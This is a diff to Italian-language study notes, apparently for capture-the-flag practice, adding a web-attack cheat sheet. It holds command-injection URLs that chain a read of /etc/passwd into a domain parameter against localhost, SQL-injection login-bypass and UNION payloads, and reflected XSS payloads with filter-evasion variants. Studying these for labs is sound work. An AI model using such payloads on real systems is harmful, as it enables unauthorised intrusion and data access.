@@ -84,7 +84,11 @@
     -  `| ls`
   -  Ricordarsi di provare con e senza spazi
 
-
+Esempi comuni per accedere a un file:
+```bash
+http://localhost:8000/?domain=www.ulisse.unibo.it/../||tail%20%22/etc/passwd%22
+http://localhost:8081/?domain=www.ulisse.unibo.it/../||tail%20%27/etc/passwd%27
+```
 
 === SQL Injection
 
@@ -120,6 +124,42 @@
   ```
   - E scriviamo, al posto dell'id nella richiesta HTTP originale, la nostra query codificata
 
+==== Login
+Payload classico:
+- user: admin
+- password: `'OR '1' = '1`
+
+```
+oR '1'>'0
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+```
+
+== XSS
+=== Reflected
+Dobbiamo mostrare un alert in JavaScript:
+```javascript
+<script>alert('XSS');</script>
+```
+- Provare a inserire spazi, ad esempio 
+```javascript
+<script >alert('XSS');</script>
+```
+- Provare a cambiare lettere da minuscole a maiuscole
+```javascript
+<scRipt >alert('XSS');</script>
+```
+
+- Abbiamo un form che come output code ha `<img src="prova">`
+  - allora possiamo utilizzare il payload
+  ```javascript
+  x" onerror="alert(1)
+  ```
+  cosicché l'output code alla fine sarà 
+  
+  `<img src="x" onerror="alert(1)">`
+
+  - nel caso il sito filtri la parola onerror basta usare il paylaod 
+  `x" oneonerrorrror="alert(1)`
 == Binary Exploit
 
 - Comandi di `gdb`:
